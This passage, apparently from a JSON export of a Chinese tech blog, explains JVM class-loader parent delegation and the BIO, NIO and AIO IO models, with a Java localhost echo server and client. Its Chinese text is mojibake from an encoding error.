3ã€åœ¨å†…å­˜ä¸­ç”Ÿæˆä¸€ä¸ªä»£è¡¨è¿™ä¸ªç±»çš„java.lang.Classå¯¹è±¡ï¼Œä½œä¸ºæ–¹æ³•åŒºè¿™ä¸ªç±»çš„å„ç§æ•°æ®çš„è®¿é—®å…¥å£ã€‚è¿™ä¸ªClasså¯¹è±¡å¹¶æ²¡æœ‰è§„å®šæ˜¯åœ¨Javaå †å†…å­˜ä¸­ï¼Œå®ƒæ¯”è¾ƒç‰¹æ®Šï¼Œè™½ä¸ºå¯¹è±¡ï¼Œä½†å­˜æ”¾åœ¨æ–¹æ³•åŒºä¸­ã€‚ åŒäº²å§”æ´¾æ¨¡å¼ å‡çº§å¤„ç†äº¤ç”±æœ€é¡¶çº§å¤„ç† æœ€é¡¶çº§è¯´æˆ‘è¿™æ²¡ä½ ä»¬éšä¾¿ åœ¨é™çº§å¤„ç† åŒäº²å§”æ´¾æ¨¡å¼æ˜¯åœ¨Java 1.2åå¼•å…¥çš„ï¼Œå…¶å·¥ä½œåŸç†çš„æ˜¯ï¼Œå¦‚æœä¸€ä¸ªç±»åŠ è½½å™¨æ”¶åˆ°äº†ç±»åŠ è½½è¯·æ±‚ï¼Œå®ƒå¹¶ä¸ä¼šè‡ªå·±å…ˆå»åŠ è½½ï¼Œè€Œæ˜¯æŠŠè¿™ä¸ªè¯·æ±‚å§”æ‰˜ç»™çˆ¶ç±»çš„åŠ è½½å™¨å»æ‰§è¡Œï¼Œå¦‚æœçˆ¶ç±»åŠ è½½å™¨è¿˜å­˜åœ¨å…¶çˆ¶ç±»åŠ è½½å™¨ï¼Œåˆ™è¿›ä¸€æ­¥å‘ä¸Šå§”æ‰˜ï¼Œä¾æ¬¡é€’å½’ï¼Œè¯·æ±‚æœ€ç»ˆå°†åˆ°è¾¾é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œå¦‚æœçˆ¶ç±»åŠ è½½å™¨å¯ä»¥å®Œæˆç±»åŠ è½½ä»»åŠ¡ï¼Œå°±æˆåŠŸè¿”å›ï¼Œå€˜è‹¥çˆ¶ç±»åŠ è½½å™¨æ— æ³•å®Œæˆæ­¤åŠ è½½ä»»åŠ¡ï¼Œå­åŠ è½½å™¨æ‰ä¼šå°è¯•è‡ªå·±å»åŠ è½½ï¼Œè¿™å°±æ˜¯åŒäº²å§”æ´¾æ¨¡å¼ï¼Œå³æ¯ä¸ªå„¿å­éƒ½å¾ˆæ‡’ï¼Œæ¯æ¬¡æœ‰æ´»å°±ä¸¢ç»™çˆ¶äº²å»å¹²ï¼Œç›´åˆ°çˆ¶äº²è¯´è¿™ä»¶äº‹æˆ‘ä¹Ÿå¹²ä¸äº†æ—¶ï¼Œå„¿å­è‡ªå·±æƒ³åŠæ³•å»å®Œæˆï¼Œæ‰€ä»¥é»˜è®¤æ˜¯çˆ¶è£…è½½ 1.ç±»åŠ è½½å™¨æ”¶åˆ°ç±»åŠ è½½çš„è¯·æ±‚ 2.å°†è¿™ä¸ªè¯·æ±‚å‘ä¸Šå§”æ‰˜ç»™çˆ¶ç±»åŠ è½½å™¨å»å®Œæˆ,ä¸€ç›´å‘ä¸Šå§”æ‰˜,ç›´åˆ°å¯åŠ¨ç±»åŠ è½½å™¨ 3.å¯åŠ¨åŠ è½½å™¨æ£€æŸ¥æ˜¯å¦èƒ½å¤ŸåŠ è½½å½“å‰è¿™ä¸ªç±»,èƒ½åŠ è½½å°±ç»“æŸ,ä½¿ç”¨å½“å‰çš„åŠ è½½å™¨,å¦åˆ™,æŠ›å‡ºå¼‚å¸¸,é€šçŸ¥å­åŠ è½½å™¨è¿›è¡ŒåŠ è½½ 4.é‡å¤æ­¥éª¤ 3 Class Not Found","categories":[],"tags":[{"name":"JVM","slug":"JVM","permalink":"https://blog.kayleh.top/tags/JVM/"}]},{"title":"AIO blocking model","slug":"AIOæ¨¡å‹","date":"2020-12-04T19:57:07.000Z","updated":"2021-04-11T17:11:28.086Z","comments":true,"path":"AIOæ¨¡å‹/","link":"","permalink":"https://blog.kayleh.top/AIO%E6%A8%A1%E5%9E%8B/","excerpt":"","text":"AIOæ¨¡å‹1. åœ¨ç³»ç»Ÿå±‚é¢åˆ†æIOæ¨¡å‹å½“æˆ‘ä»¬ä»ç½‘ç»œä¸­æˆ–è€…å…¶ä»–è¿›ç¨‹ä¸­æ¥æ”¶åˆ°æ•°æ®æ—¶ï¼Œè¿™ä¸ªæ•°æ®ä¼šå…ˆè¢«æ‹·è´åˆ°ç³»ç»Ÿå†…æ ¸çš„ç¼“å†²åŒºï¼Œç„¶åä»å†…æ ¸çš„ç¼“å†²åŒºä¸­å†å¤åˆ¶åˆ°æˆ‘ä»¬åº”ç”¨ç¨‹åºå¯¹åº”çš„ç¼“å†²åŒºä¸­ï¼Œè¿™æ ·æˆ‘ä»¬æ‰èƒ½å®ç°ä»åº”ç”¨ç¨‹åºä¸­å–å¾—è¿™ä¸ªæ•°æ®ã€‚ 1.1 BIOæ¨¡å‹åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºä¼šé¦–å…ˆè°ƒç”¨ç‰¹å®šçš„å‡½æ•°ï¼Œè¿™æ ·æ‰èƒ½å»è®¿é—®æˆ‘ä»¬çš„æ“ä½œç³»ç»Ÿã€‚æ‹¿æˆ‘ä»¬çš„BIOèŠå¤©å®¤æ¥è¯´ï¼Œæˆ‘ä»¬åœ¨æœåŠ¡å™¨ä¸Šï¼Œæƒ³çœ‹ä¸€ä¸‹å®¢æˆ·ç«¯ä»ç½‘ç»œä¸Šä¼ é€’è¿‡æ¥çš„æ•°æ®æœ‰æ²¡æœ‰å‡†å¤‡å¥½ï¼Œé‚£ä¹ˆå®ƒä¼šå»è¯¢é—®æ“ä½œç³»ç»Ÿæœ‰æ²¡æœ‰æ”¶åˆ°æ–°çš„æ•°æ®ï¼Œå¦‚æœæ²¡æœ‰æ”¶åˆ°ï¼Œå®ƒä¼šä¸€ç›´é˜»å¡åœ¨è¿™é‡Œï¼Œç›´åˆ°æ”¶åˆ°æ¶ˆæ¯ï¼Œå¹¶ä¸”å·²ç»ä»ç³»ç»Ÿå†…æ ¸ç¼“å†²åŒºä¸­æ‹·è´åˆ°åº”ç”¨ç¨‹åºçš„ç¼“å†²åŒºä¸­ï¼Œè¿™æ ·è¿™ä¸ªè°ƒç”¨æ‰èƒ½å¤ŸæˆåŠŸè¿”å›ã€‚è¿™å°±æ˜¯é˜»å¡å¼IOï¼Œæˆ‘ä»¬åœ¨ç­‰å¾…çš„è¿‡ç¨‹ä¸­ï¼Œä»€ä¹ˆéƒ½åšä¸äº†ã€‚ 1.2 NIOæ¨¡å‹åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° å½“æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºè¿›è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œè¯¢é—®æ•°æ®æœ‰æ²¡æœ‰å‡†å¤‡å¥½ï¼Œæ²¡æœ‰å‡†å¤‡å¥½çš„è¯ï¼Œå› ä¸ºå®ƒæ˜¯éé˜»å¡çš„ï¼Œæ‰€ä»¥ç›´æ¥è¿”å›ï¼›ç›´åˆ°ç³»ç»Ÿå·²ç»å°†å†…æ ¸ç¼“å†²åŒºä¸­çš„æ•°æ®å¤åˆ¶åˆ°åº”ç”¨ç¨‹åºçš„ç¼“å†²åŒºä¸­ï¼Œè¿™æ—¶æˆ‘ä»¬å†å»è¯¢é—®æ•°æ®æœ‰æ²¡æœ‰å‡†å¤‡å¥½çš„è¯ï¼Œå°±èƒ½å¤Ÿè·å–åˆ°æˆ‘ä»¬æƒ³è¦çš„æ•°æ®äº†ã€‚ä½†æ˜¯å®ƒå¹¶ä¸åŒ…æ‹¬Selectorç›‘å¬æ¨¡å¼ï¼Œä»…ä»…æ˜¯NIOä¸­çš„éé˜»å¡å¼æ¨¡å‹ã€‚ 1.2.1 IOå¤šè·¯å¤ç”¨åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° è¿™ä¸ªæ¨¡å¼å¯¹åº”çš„å°±æ˜¯æˆ‘ä»¬NIOèŠå¤©å®¤ä¸­é‡‡ç”¨çš„æ¨¡å¼ï¼Œä½¿ç”¨äº†Selectorç›‘å¬ é¦–å…ˆæˆ‘ä»¬çš„åº”ç”¨ç¨‹åºå‘èµ·æ–°çš„è¯¢é—®ï¼Œæ˜¯ä¸æ˜¯æœ‰å¯ç”¨çš„æ•°æ®è¿›è¡Œæ“ä½œäº†ï¼Œå¦‚æœæ•°æ®è¿™æ—¶æ²¡æœ‰å‡†å¤‡å¥½ï¼Œå¹¶ä¸ä¼šå¦‚ä¸ŠNIOç›´æ¥è¿”å›ï¼Œè€Œæ˜¯è¯´ï¼Œæˆ‘ä»¬è¦æ±‚å†…æ ¸ç›‘å¬æˆ‘ä»¬è¿™ä¸ªIOé€šé“ï¼Œç›´åˆ°å®ƒæœ‰äº†æ•°æ®å¯ä»¥ä¾›æˆ‘ä»¬çš„ç¨‹åºè¿›è¡Œæ“ä½œäº†ï¼Œå†æ¥é€šçŸ¥æˆ‘ä»¬ï¼Œè¿™ä¸ªç›‘å¬çš„è¿‡ç¨‹ï¼Œå°±åƒæˆ‘ä»¬èŠå¤©å®¤ä¸­çš„select()æ–¹æ³•ï¼Œå®ƒæ˜¯é˜»å¡çš„ã€‚ç›´åˆ°æ•°æ®å·²ç»åœ¨ç³»ç»Ÿå†…æ ¸ç¼“å­˜åŒºä¸­å‡†å¤‡å¥½äº†ï¼Œå®ƒä¼šé€šçŸ¥ä½ ä¸€ä¸‹ï¼Œå‘Šè¯‰ä½ å¯ä»¥æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œå°†ç¼“å­˜åŒºä¸­çš„æ•°æ®å¤åˆ¶åˆ°åº”ç”¨ç¨‹åºç¼“å­˜åŒºä¸­ï¼Œè¿™æ—¶æˆ‘ä»¬æ‰çœŸæ­£è·å–åˆ°äº†æˆ‘ä»¬æƒ³è¦çš„æ•°æ® åœ¨è¿™ä¸ªæ—¶å€™ï¼Œç³»ç»Ÿå†…æ ¸èƒ½å¤Ÿç›‘å¬å¤šä¸ªIOé€šé“ï¼Œè·Ÿæˆ‘ä»¬çš„èŠå¤©å®¤ä¸€æ ·ï¼Œå®ƒä¹Ÿç›‘å¬äº†å¤šä¸ªé€šé“ï¼Œåªè¦å…¶ä¸­ä»»ä½•ä¸€ä¸ªIOé€šé“æœ‰äº†æ–°çš„çŠ¶æ€æ›´æ–°ï¼Œé‚£ä¹ˆè¿™ä¸ªç›‘å¬éƒ½ä¼šè¿”å›ç»™æˆ‘ä»¬åº”ç”¨ç¨‹åºè¯´ï¼Œå…¶ä¸­çš„IOé€šé“æœ‰ä¸€ä¸ªæˆ–è€…å¤šä¸ªå‡ºç°äº†çŠ¶æ€çš„å˜åŒ–ï¼Œä½ è¦ä¸è¦å¯¹å…¶è¿›è¡Œå¤„ç†ä¸€ä¸‹ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥æ ¹æ®å®ƒè¿”å›çš„æ¡ä»¶ï¼Œè¿›è¡Œç‰¹å®šçš„å¤„ç†ã€‚ï¼ˆSelectorå¯ä»¥ç¿»è¯‘æˆä¸ºIOå¤šè·¯å¤ç”¨å™¨ï¼‰ 1.3 AIOæ¨¡å‹ï¼ˆå¼‚æ­¥IOï¼‰åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° BIOå’ŒNIOéƒ½æ˜¯åŒæ­¥IOæ¨¡å‹ï¼Œè¿™é‡Œæˆ‘ä»¬è¯´è¯´AIOï¼ˆå¼‚æ­¥ï¼‰æ¨¡å‹ åŒæ­¥IOæ¨¡å‹æ˜¯å½“æˆ‘ä»¬è®¿é—®çš„è¿™ä¸ªæ•°æ®æ— è®ºæœ‰æ²¡æœ‰å‡†å¤‡å¥½ï¼Œéƒ½ä¼šè¿”å›ç»™ä½ ç»“æœï¼›å½“æ•°æ®æ²¡æœ‰å‡†å¤‡å¥½çš„æ—¶å€™ï¼Œæˆ‘ä»¬æ²¡æœ‰èƒ½å¤Ÿè·å–æ•°æ®ï¼Œå¦‚æœæˆ‘ä»¬å†ä¹Ÿä¸å‘èµ·è·å–æ•°æ®çš„è¯·æ±‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ°¸è¿œéƒ½ä¸ä¼šå†è·å–åˆ°è¿™ä¸ªæ•°æ®ã€‚å¼‚æ­¥IOå°±ä¸åŒäº†ï¼Œå½“ä½ è¯·æ±‚è¿™ä¸ªæ•°æ®æ²¡æœ‰è¯·æ±‚åˆ°ï¼Œè€Œä¹‹åè¿™ä¸ªæ•°æ®å‡†å¤‡å¥½äº†ï¼Œå®ƒå°±ä¼šå›å»é€šçŸ¥ä½ ï¼Œå¯ä»¥æ¥å–è¿™ä¸ªæ•°æ®äº† æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªæµç¨‹ï¼šæˆ‘ä»¬å»è¯·æ±‚æ•°æ®ï¼Œæ•°æ®æ²¡æœ‰å‡†å¤‡å¥½ï¼Œæˆ‘ä»¬æ²¡æœ‰è¢«é˜»å¡ï¼Œè€Œæ˜¯ç›´æ¥è¿”å›äº†ã€‚åœ¨åº”ç”¨ç¨‹åºå±‚é¢ï¼Œè™½ç„¶æˆ‘ä»¬æ²¡æœ‰å†å‘èµ·æ–°çš„è¯·æ±‚ï¼Œä½†æ˜¯åœ¨ç³»ç»Ÿåå°ï¼Œä¼šç›‘å¬è¿™ä¸ªæˆ‘ä»¬è¯·æ±‚æ•°æ®çš„çŠ¶æ€ï¼Œå½“æˆ‘ä»¬éœ€è¦çš„æ•°æ®å·²ç»å‡†å¤‡å¥½äº†ï¼Œå¹¶ä¸”å·²ç»å­˜åœ¨äºç³»ç»Ÿå†…æ ¸ç¼“å­˜åŒºä¸­äº†ï¼Œç³»ç»Ÿåå°è¿˜ä¼šå°†è¿™ä¸ªæ•°æ®æ‹·è´åˆ°æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºç¼“å­˜åŒºä¸­ï¼Œåˆ°è¿™é‡Œï¼Œç³»ç»Ÿå†…æ ¸ä¼šé€’äº¤ç»™æˆ‘ä»¬ä¸€ä¸ªä¿¡å·ï¼Œå‘Šè¯‰ä½ ï¼Œä½ ä¹‹å‰æƒ³è¦çš„è¿™ä¸ªæ•°æ®ï¼Œå·²ç»å‡†å¤‡å¥½ç»™ä½ äº†ï¼Œä½ å¯ä»¥è¿›è¡Œä½¿ç”¨äº†ã€‚ å®ƒçš„å¼‚æ­¥ä½“ç°åœ¨ï¼šæˆ‘ä»¬ç¨‹åºåªå¯¹æ•°æ®å‘èµ·äº†ä¸€æ¬¡è¯·æ±‚ï¼Œæ²¡æœ‰è¯·æ±‚åˆ°ï¼Œå°±ç›´æ¥è¿”å›äº†ï¼Œè€Œä¹‹åï¼Œå½“è¿™ä¸ªæ•°æ®å·²ç»å‡†å¤‡å¥½çš„æ—¶å€™ï¼Œç³»ç»Ÿå›æ¥é€šçŸ¥æˆ‘ä»¬ï¼Œè€Œä¸éœ€è¦æˆ‘ä»¬å†æ¬¡å‘èµ·è¯·æ±‚ï¼Œå°±èƒ½è·å–åˆ°è¿™ä¸ªæ•°æ®ï¼Œè¿™å°±ä½“ç°äº†å¼‚æ­¥çš„ç‰¹ç‚¹ã€‚Aå°±æ˜¯asynchronousï¼Œä¹Ÿå°±æ˜¯å¼‚æ­¥çš„æ„æ€ 2. å¼‚æ­¥è°ƒç”¨æœºåˆ¶2.1 AIOä¸­çš„å¼‚æ­¥æ“ä½œåœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° å®¢æˆ·ç«¯å¯¹åº”AsynchronousSocketChannel æœåŠ¡ç«¯å¯¹åº”AsynchronousServerSocketChannel å»ºç«‹è¿æ¥ä¸ºconnect/accept è¯»æ“ä½œä¸ºread å†™æ“ä½œä¸ºwrite 2.2 é€šè¿‡Futureè¿›è¡Œå¼‚æ­¥è°ƒç”¨åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° æ³¨æ„å…¶ä¸­Futureçš„get()æ–¹æ³•æ˜¯é˜»å¡å¼çš„ 2.3 é€šè¿‡CompletionHandlerï¼ˆå¤šç”¨ï¼‰åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° åœ¨æ‰§è¡Œæ“ä½œçš„æ—¶å€™ï¼Œä¼ å…¥CompletionHandlerå‚æ•° 3. å®æˆ˜ï¼ˆå›éŸ³æœåŠ¡å™¨ï¼‰3.1 æœåŠ¡å™¨ç«¯3.1.1 å­—æ®µåœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 3.1.2 ä¸»æ–¹æ³•åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 3.1.3 AcceptHandlerçš„å®ç°åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 3.1.4 ClientHandlerçš„å®ç°åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 3.2 å®¢æˆ·ç«¯3.2.1 å­—æ®µåœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 3.2.2 ä¸»æ–¹æ³•åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 4. ä»£ç 4.1 æœåŠ¡å™¨ç«¯import java.io.Closeable; import java.io.IOException; import java.net.InetSocketAddress; import java.nio.ByteBuffer; import java.nio.channels.AsynchronousServerSocketChannel; import java.nio.channels.AsynchronousSocketChannel; import java.nio.channels.CompletionHandler; import java.util.HashMap; import java.util.Map; public class Server { private static final String LOCALHOST = &quot;localhost&quot;; private static final int DEFAULT_PORT = 8888; private AsynchronousServerSocketChannel serverChannel; private void close(Closeable closeable){ try { closeable.close(); } catch (IOException e) { e.printStackTrace(); } } public void start(){ try { //ç»‘å®šç«¯å£å·,è°ƒç”¨çš„openæ–¹æ³•ï¼ˆæ— å‚ï¼‰ï¼Œè¿™ä¸ªå‚æ•°ç±»å‹ä¸ºAsynchronousChannelGroupï¼Œå…¶ä¸­åŒ…å«å…±äº«çš„ç³»ç»Ÿèµ„æºï¼Œå¦‚çº¿ç¨‹æ± ï¼Œ //å› ä¸ºæˆ‘ä»¬æ²¡æœ‰ä¼ å…¥å‚æ•°ï¼Œä¼šä»é»˜è®¤çš„ProviderHolderä¸­ï¼Œæä¾›ä¸€ä¸ªæˆ‘ä»¬éœ€è¦çš„AsynchronousServerSocketChannelå¯¹è±¡ //Handlerä¼šåœ¨ä¸åŒçš„çº¿ç¨‹ä¸­è¿›è¡Œå¤„ç†ï¼Œå¦‚æˆ‘ä»¬çš„AcceptHandlerå’ŒClientHandlerï¼Œå®ƒå°±æ˜¯åŠ¨ç”¨çš„å…±äº«èµ„æºï¼šçº¿ç¨‹ï¼Œæ¥æ‰§è¡Œ serverChannel = AsynchronousServerSocketChannel.open(); serverChannel.bind(new InetSocketAddress(LOCALHOST,DEFAULT_PORT)); System.out.println(&quot;æœåŠ¡å™¨å¯åŠ¨æˆåŠŸï¼Œç›‘å¬ç«¯å£å·ï¼š&quot; + DEFAULT_PORT); while (true){ //è¯¥acceptæ–¹æ³•ä¸ºå¼‚æ­¥è°ƒç”¨ï¼Œæ²¡æœ‰éœ€è¦è¿”å›çš„ç»“æœä¹Ÿä¼šè¿”å›ï¼Œå³æ²¡æœ‰æ”¶åˆ°å®¢æˆ·è¿æ¥çš„è¯·æ±‚æ—¶ //å°±ä¼šè¿”å›ç»“æœäº†ï¼›ä½†æ˜¯æˆ‘ä»¬è¦ä¿è¯åœ¨æœ‰å®¢æˆ·è¿æ¥çš„æ—¶å€™ï¼Œä¸»çº¿ç¨‹è¿˜åœ¨è¿è¡Œï¼Œå¦åˆ™ä¸»çº¿ç¨‹è¿”å› //æœåŠ¡å™¨å°±ç›´æ¥å®•æœºäº†ï¼Œæˆ‘ä»¬é‡‡ç”¨ä¸‹é¢çš„å°æŠ€å·§æ¥é¿å…è¿™ç§æƒ…å†µ //acceptåœ¨ç³»ç»Ÿå±‚é¢å®Œæˆçš„æ—¶å€™ï¼ˆç³»ç»Ÿå¸®åŠ©æˆ‘ä»¬å®Œæˆäº†è¿™ä¸ªIOå¤„ç†ï¼‰ï¼Œè¿”å›çš„ç»“æœä¼šè¢«AcceptHandleræ¥å¤„ç†ï¼Œ //æˆåŠŸæ—¶æ‰§è¡Œçš„completedæ–¹æ³•ï¼Œå¤±è´¥æ‰§è¡Œçš„æ˜¯failedæ–¹æ³• //é™„å¸¦å¯¹è±¡æ— ï¼›AcceptHandlerä¸ºå®ç°æ¥å£CompletionHandlerçš„ç±»ï¼Œå¤„ç†acceptè¯·æ±‚ serverChannel.accept(null,new AcceptHandler()); //ç”¨è¿™ä¸ªæ¥é¿å…whileè¿‡äºé¢‘ç¹ï¼Œç›¸å½“äºå°†ä¸»çº¿ç¨‹é˜»å¡ï¼Œä»¥ä¿è¯å»ºç«‹è¿æ¥æ—¶ä¸å®¢æˆ·ç«¯çš„å“åº” System.in.read(); } } catch (IOException e) { e.printStackTrace(); }finally { close(serverChannel); } } /** * ç¨‹åºå¤„ç†acceptè¯·æ±‚çš„æ—¶å€™ï¼Œå¹¶ä¸æ˜¯åœ¨ä¸»çº¿ç¨‹ä¸­æ‰§è¡Œçš„ï¼Œ * è€Œæ˜¯ä»AsynchronousChannelGroupä¸­å–å‡ºå¦ä¸€ä¸ªçº¿ç¨‹æ¥æ‰§è¡Œ * CompletionHandleræ³›å‹ä¸ºï¼Œç¬¬ä¸€ä¸ªä¸ºè¿”å›çš„ç»“æœç±»å‹ï¼›ç¬¬äºŒä¸ªä¸ºé™„å¸¦çš„å¯¹è±¡ç±»å‹ */ private class AcceptHandler implements CompletionHandler&lt;AsynchronousSocketChannel,Object&gt; { /** * completed è¯¥æ–¹æ³•å¯¹åº”çš„æ˜¯ï¼Œæˆ‘ä»¬ä¹‹å‰ä¸Šæ–¹è°ƒç”¨acceptæ–¹æ³•ï¼Œæ­£å¸¸è¿”å›äº†ï¼Œé‚£ä¹ˆä¼šæ‰§è¡Œè¯¥æ–¹æ³• * @param result æ–¹æ³•æ‰§è¡ŒæˆåŠŸçš„è¿”å›å€¼ * @param attachment é™„å¸¦ä¿¡æ¯ */ @Override public void completed(AsynchronousSocketChannel result, Object attachment) { if(serverChannel.isOpen()){ //ç¡®ä¿æœåŠ¡å™¨è¿˜åœ¨è¿è¡Œ //æœåŠ¡å™¨ç»§ç»­ç­‰å¾…ä¸‹ä¸€ä¸ªå®¢æˆ·ç«¯æ¥è¯·æ±‚ï¼Œä½†æ˜¯è¿™é‡Œå¹¶ä¸æ˜¯äº§ç”Ÿè¿‡å¤šçš„acceptæ–¹æ³•å‹æ ˆ //è€Œé€ æˆçš„æ ˆæº¢å‡ºé—®é¢˜ï¼Œè¿™åœ¨åº•å±‚å·²ç»è¿›è¡Œä¿æŠ¤äº† serverChannel.accept(null,this); } //å¤„ç†å·²è¿æ¥å®¢æˆ·ç«¯çš„è¯»å†™æ“ä½œ AsynchronousSocketChannel clientChannel = result; if(clientChannel != null &amp;&amp; clientChannel.isOpen()){ ClientHandler handler = new ClientHandler(clientChannel); ByteBuffer buffer = ByteBuffer.allocate(1024); Map&lt;String,Object&gt; attachmentInfo = new HashMap&lt;&gt;(); attachmentInfo.put(&quot;type&quot;,&quot;read&quot;); attachmentInfo.put(&quot;buffer&quot;,buffer); //ä¾é ClientHandlerå¼‚æ­¥å¤„ç†ï¼Œè¯»å†™æ“ä½œï¼Œå°†å…¶å›ä¼ ç»™å®¢æˆ·ç«¯ clientChannel.read(buffer,attachmentInfo,handler); } } @Override public void failed(Throwable exc, Object attachment) { //å¤±è´¥æ—¶çš„è°ƒç”¨ } } private class ClientHandler implements CompletionHandler&lt;Integer,Map&lt;String,Object&gt;&gt; { private AsynchronousSocketChannel clientChannel; public ClientHandler(AsynchronousSocketChannel clientChannel) { this.clientChannel = clientChannel; } @Override public void completed(Integer result, Map&lt;String, Object&gt; attachment) { String type = (String) attachment.get(&quot;type&quot;); ByteBuffer buffer = (ByteBuffer) attachment.get(&quot;buffer&quot;); if(&quot;read&quot;.equals(type)){ //å·²ç»è¯»å–åˆ°äº†å®¢æˆ·ç«¯ä¼ è¿‡æ¥çš„æ¶ˆæ¯ï¼Œå°†å…¶å›éŸ³ç»™å®¢æˆ·ç«¯ buffer.flip();//å›éŸ³è¦è¯»ç¼“å†²åŒº attachment.put(&quot;type&quot;,&quot;write&quot;); clientChannel.write(buffer,attachment,this); }else if (&quot;write&quot;.equals(type)){ //å°†å…¶å›ä¼ ç»™å®¢æˆ·ç«¯åï¼Œç­‰å¾…å®¢æˆ·ç«¯çš„æ–°çš„ä¿¡æ¯ //å°†è¿™é‡Œå°†å†æ¬¡è¿›è¡Œå¼‚æ­¥è°ƒç”¨ï¼Œè¯»å–å®¢æˆ·ç«¯å‘æ¥çš„ä¿¡æ¯å­˜å‚¨åœ¨ç¼“å†²åŒºä¸­ ByteBuffer byteBuffer = ByteBuffer.allocate(1024); attachment.put(&quot;type&quot;,&quot;read&quot;); attachment.put(&quot;buffer&quot;,byteBuffer); clientChannel.read(byteBuffer,attachment,this); } } @Override public void failed(Throwable exc, Map&lt;String, Object&gt; attachment) { } } public static void main(String[] args) { Server server = new Server(); server.start(); } } 4.2 å®¢æˆ·ç«¯import java.io.*; import java.net.InetSocketAddress; import java.nio.ByteBuffer; import java.nio.channels.AsynchronousSocketChannel; import java.util.concurrent.ExecutionException; import java.util.concurrent.Future; public class Client { private final String LOCALHOST = &quot;localhost&quot;; private final int DEFAULT_PORT = 8888; AsynchronousSocketChannel clientChannel; private void close(Closeable closeable){ try { closeable.close(); } catch (IOException e) { e.printStackTrace(); } } public void start(){ try { clientChannel = AsynchronousSocketChannel.open(); Future&lt;Void&gt; connect = clientChannel.connect(new InetSocketAddress(LOCALHOST, DEFAULT_PORT)); connect.get();//é˜»å¡å¼è°ƒç”¨ï¼Œç›´åˆ°æœ‰ç»“æœæ‰è¿”å› //è¯»å–ç”¨æˆ·çš„è¾“å…¥ BufferedReader in = new BufferedReader(new InputStreamReader(System.in)); while (true){ String input = in.readLine(); byte[] inputBytes = input.getBytes(); ByteBuffer buffer = ByteBuffer.wrap(inputBytes); //å‘æœåŠ¡å™¨å‘é€æ¶ˆæ¯ Future&lt;Integer&gt; write = clientChannel.write(buffer); write.get(); //æ¥æ”¶æœåŠ¡å™¨ä¼ æ¥çš„æ¶ˆæ¯ buffer.flip(); Future&lt;Integer&gt; read = clientChannel.read(buffer); read.get(); String s = new String(buffer.array()); System.out.println(s); buffer.clear(); } } catch (IOException e) { e.printStackTrace(); } catch (InterruptedException e) { e.printStackTrace(); } catch (ExecutionException e) { e.printStackTrace(); }finally { close(clientChannel); } } public static void main(String[] args) { Client client = new Client(); client.start(); } } 5. æµ‹è¯•ç»“æœåœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° å®æˆ˜1. AIOæ¨¡å‹åˆ†æåœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° AsynchronousServerSocketï¼šå®ƒå±äºä¸€ä¸ªAsynchronousChannelGroupï¼Œè¿™ä¸ªé€šé“ç»„ï¼Œå…¶å®æ˜¯è¢«å¤šä¸ªå¼‚æ­¥é€šé“å…±äº«çš„èµ„æºç¾¤ç»„ï¼Œè¿™é‡Œè¾¹æˆ‘ä»¬ä¹‹å‰æåˆ°è¿‡ï¼Œæœ‰ä¸€ä¸ªéå¸¸é‡è¦çš„èµ„æºï¼šçº¿ç¨‹æ± ï¼Œç³»ç»Ÿä¼šåˆ©ç”¨çº¿ç¨‹æ± ä¸­çš„çº¿ç¨‹ï¼Œæ¥å¤„ç†ä¸€äº›handlerè¯·æ±‚ã€‚ç³»ç»Ÿåˆ©ç”¨è¿™ä¸ªèµ„æºç»„è¿˜ä¸ºæˆ‘ä»¬åšäº†å¾ˆå¤šçš„äº‹æƒ…ï¼ŒåŒ…æ‹¬å®ƒèƒ½åœ¨æ•°æ®å‡†å¤‡å¥½çš„æ—¶å€™é€šçŸ¥æˆ‘ä»¬å’Œåˆ©ç”¨handleråšä¸€äº›å¼‚æ­¥çš„æ“ä½œã€‚å½“æˆ‘ä»¬åœ¨åˆ›å»ºAsynchronousServerSocketæ—¶(open())ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰ä¸€ä¸ªé€šé“ç»„ï¼Œå½“ç„¶æˆ‘ä»¬ä¸ä¼ å‚çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šé»˜è®¤ç»™æˆ‘ä»¬ä¸€ä¸ªç¾¤ç»„ã€‚ åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° å½“å®¢æˆ·ç«¯è¯·æ±‚ä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥æ—¶ï¼Œç³»ç»Ÿä¼šå¼‚æ­¥çš„è°ƒç”¨AcceptHandleræ¥å¤„ç†è¿æ¥è¯·æ±‚ï¼ŒæˆåŠŸå»ºç«‹è¿æ¥åï¼Œä¼šè¿”å›ä¸€ä¸ªAsynchronousSocketChannelå¯¹è±¡ï¼Œæ¯ä¸ªå¯¹è±¡è¿˜ä¼šæœ‰ä¸€ä¸ªClientHandleræ¥å¤„ç†è¯»å†™è¯·æ±‚ï¼Œåœ¨è¯·æ±‚å¤„ç†çš„è¿‡ç¨‹ä¸­ï¼Œå¹¶ä¸æ˜¯åœ¨ä¸»çº¿ç¨‹ä¸­å®Œæˆçš„ï¼Œè€Œæ˜¯é€šé“ç»„åˆ©ç”¨çº¿ç¨‹æ± 